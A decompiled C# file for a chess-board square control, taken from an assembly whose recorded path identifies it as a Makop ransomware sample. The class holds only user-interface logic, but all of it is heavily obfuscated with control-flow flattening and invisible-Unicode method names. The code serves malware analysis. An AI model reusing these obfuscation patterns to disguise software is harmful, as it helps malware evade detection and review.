// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: 生ث, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8221468-4DC3-4423-BEC3-5B04CD1AB276
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-2570b1f0780a754b70c2ec5525da16952c9634a2da6b21c92693380529daffe2.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 1024031464;
        EventHandler<MouseEventArgs> eventHandler2;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1278376295)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u202D⁭⁮‍⁫⁭‏‭‍⁬‌‭⁬‫‭‌‏‫⁫‌‮⁪‏‎‫‌⁬‏⁮⁪⁬‭‫‍‎⁫‌⁫‏‎‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -1349295608 ^ 1385447125;
              continue;
            case 2:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -107563018 ^ -1937310755;
              continue;
            case 3:
              comparand = eventHandler1;
              num1 = 298967132;
              continue;
            case 4:
              int num3 = eventHandler1 != comparand ? 1199869698 : (num3 = 889342954);
              num1 = num3 ^ (int) num2 * -248091209;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -1138002062;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1844496077)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              comparand = eventHandler1;
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200F‏‏‮​​‪⁭⁭‏​⁯‬‬⁪⁫⁫‬‪​‭‏‪‮‎‬‫‭‍‍‎‭⁭‫⁯‮​‏⁫⁫‮((Delegate) comparand, (Delegate) value);
              num1 = -844883840;
              continue;
            case 2:
              goto label_3;
            case 3:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              int num3 = eventHandler1 != comparand ? 2116763442 : (num3 = 302457213);
              num1 = num3 ^ (int) num2 * 1596454592;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
        ChessPiece piece = this.piece;
label_1:
        int num1 = 2070695183;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 57715766)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -439439692 ^ 337119755;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
        this.piece = value;
        bool flag = this.piece == null;
label_1:
        int num1 = -1825107969;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1684104335)) % 6U)
          {
            case 0:
              SimpleSquare.\u202D⁮‬‭⁭​‌⁪⁭​‍⁮⁫​⁭​⁮‌‬‫‎‪‌‮‎‪‌‎‌⁬‏⁪‎⁫‭⁪‬⁭‍‌‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = -332735803;
              continue;
            case 1:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u202D⁮‬‭⁭​‌⁪⁭​‍⁮⁫​⁭​⁮‌‬‫‎‪‌‮‎‪‌‎‌⁬‏⁪‎⁫‭⁪‬⁭‍‌‮((Control) this, (Image) null);
              num1 = (int) num2 * 1253667646 ^ 338590710;
              continue;
            case 2:
              int num3 = !flag ? 929936147 : (num3 = 1849881090);
              num1 = num3 ^ (int) num2 * 276954493;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              num1 = (int) num2 * -1670434882 ^ 1064846875;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public void colorSquare()
    {
      this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
label_1:
      int num1 = -1397499003;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -605065253)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            SimpleSquare.\u206D​⁯⁫‬‏‮‎‬‫⁭‭⁫‬⁯⁬⁮‎‭⁮‬‎⁬‪‎​⁬⁭‬⁪⁫‪‍⁭‪⁬‫‭⁬‫‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * 1367772218 ^ 583033192;
            continue;
          case 3:
            num1 = (int) num2 * 618530074 ^ 1064302928;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public Pieces Kind
    {
      set
      {
        this.Piece.Kind = value;
        this.Piece = this.Piece;
      }
    }

    public bool IsBlackSquare
    {
      get => this.isBlackSquare;
      set
      {
        this.isBlackSquare = value;
        this.colorSquare();
      }
    }

    public Repository repo
    {
      get
      {
        Repository repo = ChessContext.repo;
label_1:
        int num1 = 1205240220;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1692279003)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 1198143749 ^ 1945290484;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return repo;
      }
    }

    public SimpleSquare()
    {
      this.InitializeComponent();
      SimpleSquare.\u200B‍⁬‮⁭‎‏‬‍⁭⁭⁮‌‭⁮‌‎‎⁮‮‪‫‌‬‍‫‌⁯‫​‏‏⁭⁬⁮‬⁬‬‪‬‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
      SimpleSquare.\u202E‪⁭​⁭‏⁪⁭‌⁫‫⁮⁯‏‏‫‪‍‭⁫‫‬‪⁮⁬‭⁬⁬‭‍‪⁯‫‌‌‌‌‌⁫‬‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
      EventHandler<MouseEventArgs> click = this.Click;
      if (click == null)
        return;
      click((object) this, e);
label_3:
      int num1 = 941731123;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1349566223)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_6;
          case 2:
            num1 = (int) num2 * 316274061 ^ -715281183;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    public void HighLight()
    {
      SimpleSquare.\u206D​⁯⁫‬‏‮‎‬‫⁭‭⁫‬⁯⁬⁮‎‭⁮‬‎⁬‪‎​⁬⁭‬⁪⁫‪‍⁭‪⁬‫‭⁬‫‮((Control) this, Color.ForestGreen);
label_1:
      int num1 = 7680455;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 458265736)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1832885067 ^ 409557297;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void ClearHighLight()
    {
label_1:
      int num1 = -1926053209;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1497444122)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            SimpleSquare.\u206D​⁯⁫‬‏‮‎‬‫⁭‭⁫‬⁯⁬⁮‎‭⁮‬‎⁬‪‎​⁬⁭‬⁪⁫‪‍⁭‪⁬‫‭⁬‫‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * 929632687 ^ 425556849;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public bool IsEmpty
    {
      get
      {
        bool isEmpty = this.Piece == null;
label_1:
        int num1 = 2142570313;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1332537132)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 324083464 ^ 1141877149;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (!disposing)
        goto label_5;
label_1:
      int num1 = 1846934698;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1698537795)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u202E‫‭⁬‪​⁮‎‌⁪‫‫‏‪‌‎‮​‪⁭⁫⁬⁪‌‬‍‬‫‫‮⁮‌‏‭‏‭⁬‪‍‮((IDisposable) this.components);
            num1 = (int) num2 * -1323981145 ^ 1867092465;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_4;
          case 4:
            num1 = (int) num2 * 830988914 ^ -1058902904;
            continue;
          case 5:
            int num3 = flag ? 1965934203 : (num3 = 735909626);
            num1 = num3 ^ (int) num2 * 1334993049;
            continue;
          case 6:
            base.Dispose(disposing);
            num1 = 1216030139;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:
      return;
label_4:
      int num4 = this.components != null ? 1 : 0;
      goto label_6;
label_5:
      num4 = 0;
label_6:
      flag = num4 != 0;
      num1 = 16141409;
      goto label_2;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = -35770656;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -24807132)) % 17U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u202B​‫⁭‮​‍‏⁪‏⁪‬⁮⁭⁬‮‍‮‭​‪‏‌⁮⁪‌⁮⁬​‍‌‍⁮⁭⁯⁯⁪‍‬⁮‮((Control) this.panel1, \u003CModule\u003E.\u200B‎‍⁭‏⁭⁯‍‮‪⁫‌⁫⁪‍⁮‎⁬⁯‪⁮​‌⁯⁮⁬⁮‬⁯‪‬‌‭‪‮‎‏‪‌‮<string>(404493516U));
            num1 = (int) num2 * -899136407 ^ 288481751;
            continue;
          case 2:
            SimpleSquare.\u206E⁫⁯⁬‭‬⁪⁭⁪⁬‍‭⁬‌‮⁭⁯⁭‌‪‫‌‪⁮⁮⁯‭‪‪‮⁬‭‭⁯⁮⁭⁮‬​⁮‮((Control) this, \u003CModule\u003E.\u202C‍‌⁪‍⁭‭⁮‌‬‫​​⁫⁫‬⁭‎‍⁬⁮‌‬‭⁫⁮‫⁮⁮‌‫‪⁯‌⁮⁮⁫‭⁯‬‮<string>(834997069U));
            num1 = (int) num2 * -1661175245 ^ 347762701;
            continue;
          case 3:
            this.panel1 = SimpleSquare.\u206E⁭⁮‌​⁫‌‭‎‫‬⁪‌‬⁪⁯‫⁮​​⁪‎⁭⁭⁬‎‭‍⁮⁪⁫⁯⁯⁭‮‫‭⁭‍⁭‮();
            num1 = (int) num2 * 1552982096 ^ 1668070428;
            continue;
          case 4:
            SimpleSquare.\u202E⁪‭⁫‭‭⁪‪‎‎‏​‎‏⁫⁬‭‏‮‍‌‫​‫‍⁮⁮⁯⁬⁭‬‍‍‭‎‪⁮‍‌‬‮((Control) this);
            SimpleSquare.\u206D​⁯⁫‬‏‮‎‬‫⁭‭⁫‬⁯⁬⁮‎‭⁮‬‎⁬‪‎​⁬⁭‬⁪⁫‪‍⁭‪⁬‫‭⁬‫‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * 356372528 ^ 240609177;
            continue;
          case 5:
            num1 = (int) num2 * -147809168 ^ -812369279;
            continue;
          case 6:
            SimpleSquare.\u202D‮​‭​‍⁯⁬‮⁭‮​⁬‏‍‍⁪‮​​⁪⁫⁮⁮⁯‫‬⁫‫⁯⁯⁮⁮‮​‌⁪‪‪⁬‮((Control) this, new Size(137, 132));
            SimpleSquare.\u206B‭​‮‏‫⁮⁬⁮‎⁮⁫‌‌‎‮​‌‫​‏​⁮⁫‎‭⁪‪‮‎‮⁬‎⁬‏‭‪​⁮⁯‮((Control) this, false);
            num1 = (int) num2 * -1309772029 ^ -1755105713;
            continue;
          case 7:
            SimpleSquare.\u200F⁬‮​‌‌​⁯⁮⁬‏‭⁯‭‬‬‌⁪‍‭​⁬⁮⁭⁪‫‍‬‎‌⁮‎‫‏⁪⁮⁫‭‮⁯‮((Control) this.panel1, new Size(137, 132));
            SimpleSquare.\u202C⁪‫‍⁯⁬‍⁭‮‍​⁮⁪⁭‬⁪‌‪⁯‍⁯⁭⁫⁭⁪‭⁪⁪‮⁭‫⁭‌‌‫‬⁪⁫‮⁪‮((Control) this.panel1, 0);
            num1 = (int) num2 * 58435105 ^ -2061734394;
            continue;
          case 8:
            SimpleSquare.\u200C⁮‍⁯⁬‌‏⁮‭‭⁬⁭⁫‮⁭⁭⁫⁭‎‏⁮⁪‍‏⁭‭‬‎‬‌⁯‌‮‬‫‮‫‌‮‬‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * -1993891009 ^ -2024333604;
            continue;
          case 9:
            SimpleSquare.\u200E⁫⁯‭⁬⁯⁪‪⁫⁮‌‌‏‭​‪⁯⁬‍‎⁯‏‭⁭‏⁯‪⁫‏​⁯⁫‏⁯‎‏⁭‫‌‏‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 1698716316 ^ -1579971088;
            continue;
          case 10:
            SimpleSquare.\u200F‬​⁯⁫⁫‏⁫‮⁬⁫⁪⁪‏⁮‬‎​‮‎⁯‫⁯⁯⁮⁫‌‌‫‌‮⁯​⁬‍‮‎⁭‫‎‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -75136871 ^ 232372313;
            continue;
          case 11:
            SimpleSquare.\u200E⁫⁯‭⁬⁯⁪‪⁫⁮‌‌‏‭​‪⁯⁬‍‎⁯‏‭⁭‏⁯‪⁫‏​⁯⁫‏⁯‎‏⁭‫‌‏‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -1910035550 ^ 661506660;
            continue;
          case 12:
            goto label_1;
          case 13:
            SimpleSquare.\u200D‏⁫‬⁬‪‬‍⁯‫‫‮⁯‫⁯‪‏‮⁯‮‬⁬​‪‎‏‌⁯⁯⁭‭‮​⁮‎‬⁪​‎⁬‮(SimpleSquare.\u202A‌‬⁫‫‌‍‬‎‪‬​‮‪‌‬⁪‪‏‫‎⁬‎‫‍‮⁪‭‪‪⁮⁮‌⁫⁬‬‫‮‬‭‮((Control) this), (Control) this.panel1);
            SimpleSquare.\u202A‪⁭‏⁭⁬‌‬‮​⁬⁮‏‍‫‭⁭‏‮​⁬‭‍‍‪‬‌⁭‏⁬⁪‪⁫‫⁮⁮⁬‎⁯⁪‮((Control) this, new Padding(0));
            num1 = (int) num2 * 391483203 ^ -591438781;
            continue;
          case 14:
            SimpleSquare.\u200D⁬‍‌‫‫‍‏‪‍‍‫‭​‬⁮⁭‌‪​‍⁫⁭‫​‌⁪‎‏‌⁭⁭‭​‭⁭‌⁫⁬⁯‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * -591483088 ^ 92928926;
            continue;
          case 15:
            num1 = (int) num2 * 1446161951 ^ -573466850;
            continue;
          case 16:
            SimpleSquare.\u206B‎⁬‭‍⁮‭‪‏⁬‪⁬‎⁪‪‭⁬⁬⁯‏‏⁮⁮‮⁪⁪‫‪‪‫⁬‫‫‎‏‪⁪‎⁮‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 1757586930 ^ -2004849946;
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:;
    }

    static Delegate \u202D⁭⁮‍⁫⁭‏‭‍⁬‌‭⁬‫‭‌‏‫⁫‌‮⁪‏‎‫‌⁬‏⁮⁪⁬‭‫‍‎⁫‌⁫‏‎‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u200F‏‏‮​​‪⁭⁭‏​⁯‬‬⁪⁫⁫‬‪​‭‏‪‮‎‬‫‭‍‍‎‭⁭‫⁯‮​‏⁫⁫‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u202D⁮‬‭⁭​‌⁪⁭​‍⁮⁫​⁭​⁮‌‬‫‎‪‌‮‎‪‌‎‌⁬‏⁪‎⁫‭⁪‬⁭‍‌‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u206D​⁯⁫‬‏‮‎‬‫⁭‭⁫‬⁯⁬⁮‎‭⁮‬‎⁬‪‎​⁬⁭‬⁪⁫‪‍⁭‪⁬‫‭⁬‫‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u200B‍⁬‮⁭‎‏‬‍⁭⁭⁮‌‭⁮‌‎‎⁮‮‪‫‌‬‍‫‌⁯‫​‏‏⁭⁬⁮‬⁬‬‪‬‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202E‪⁭​⁭‏⁪⁭‌⁫‫⁮⁯‏‏‫‪‍‭⁫‫‬‪⁮⁬‭⁬⁬‭‍‪⁯‫‌‌‌‌‌⁫‬‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202E‫‭⁬‪​⁮‎‌⁪‫‫‏‪‌‎‮​‪⁭⁫⁬⁪‌‬‍‬‫‫‮⁮‌‏‭‏‭⁬‪‍‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206E⁭⁮‌​⁫‌‭‎‫‬⁪‌‬⁪⁯‫⁮​​⁪‎⁭⁭⁬‎‭‍⁮⁪⁫⁯⁯⁭‮‫‭⁭‍⁭‮() => new Panel();

    static void \u202E⁪‭⁫‭‭⁪‪‎‎‏​‎‏⁫⁬‭‏‮‍‌‫​‫‍⁮⁮⁯⁬⁭‬‍‍‭‎‪⁮‍‌‬‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u200E⁫⁯‭⁬⁯⁪‪⁫⁮‌‌‏‭​‪⁯⁬‍‎⁯‏‭⁭‏⁯‪⁫‏​⁯⁫‏⁯‎‏⁭‫‌‏‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200D⁬‍‌‫‫‍‏‪‍‍‫‭​‬⁮⁭‌‪​‍⁫⁭‫​‌⁪‎‏‌⁭⁭‭​‭⁭‌⁫⁬⁯‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u200F‬​⁯⁫⁫‏⁫‮⁬⁫⁪⁪‏⁮‬‎​‮‎⁯‫⁯⁯⁮⁫‌‌‫‌‮⁯​⁬‍‮‎⁭‫‎‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u202B​‫⁭‮​‍‏⁪‏⁪‬⁮⁭⁬‮‍‮‭​‪‏‌⁮⁪‌⁮⁬​‍‌‍⁮⁭⁯⁯⁪‍‬⁮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u200F⁬‮​‌‌​⁯⁮⁬‏‭⁯‭‬‬‌⁪‍‭​⁬⁮⁭⁪‫‍‬‎‌⁮‎‫‏⁪⁮⁫‭‮⁯‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202C⁪‫‍⁯⁬‍⁭‮‍​⁮⁪⁭‬⁪‌‪⁯‍⁯⁭⁫⁭⁪‭⁪⁪‮⁭‫⁭‌‌‫‬⁪⁫‮⁪‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u200C⁮‍⁯⁬‌‏⁮‭‭⁬⁭⁫‮⁭⁭⁫⁭‎‏⁮⁪‍‏⁭‭‬‎‬‌⁯‌‮‬‫‮‫‌‮‬‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u206B‎⁬‭‍⁮‭‪‏⁬‪⁬‎⁪‪‭⁬⁬⁯‏‏⁮⁮‮⁪⁪‫‪‪‫⁬‫‫‎‏‪⁪‎⁮‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u202A‌‬⁫‫‌‍‬‎‪‬​‮‪‌‬⁪‪‏‫‎⁬‎‫‍‮⁪‭‪‪⁮⁮‌⁫⁬‬‫‮‬‭‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u200D‏⁫‬⁬‪‬‍⁯‫‫‮⁯‫⁯‪‏‮⁯‮‬⁬​‪‎‏‌⁯⁯⁭‭‮​⁮‎‬⁪​‎⁬‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u202A‪⁭‏⁭⁬‌‬‮​⁬⁮‏‍‫‭⁭‏‮​⁬‭‍‍‪‬‌⁭‏⁬⁪‪⁫‫⁮⁮⁬‎⁯⁪‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u206E⁫⁯⁬‭‬⁪⁭⁪⁬‍‭⁬‌‮⁭⁯⁭‌‪‫‌‪⁮⁮⁯‭‪‪‮⁬‭‭⁯⁮⁭⁮‬​⁮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202D‮​‭​‍⁯⁬‮⁭‮​⁬‏‍‍⁪‮​​⁪⁫⁮⁮⁯‫‬⁫‫⁯⁯⁮⁮‮​‌⁪‪‪⁬‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206B‭​‮‏‫⁮⁬⁮‎⁮⁫‌‌‎‮​‌‫​‏​⁮⁫‎‭⁪‪‮‎‮⁬‎⁬‏‭‪​⁮⁯‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
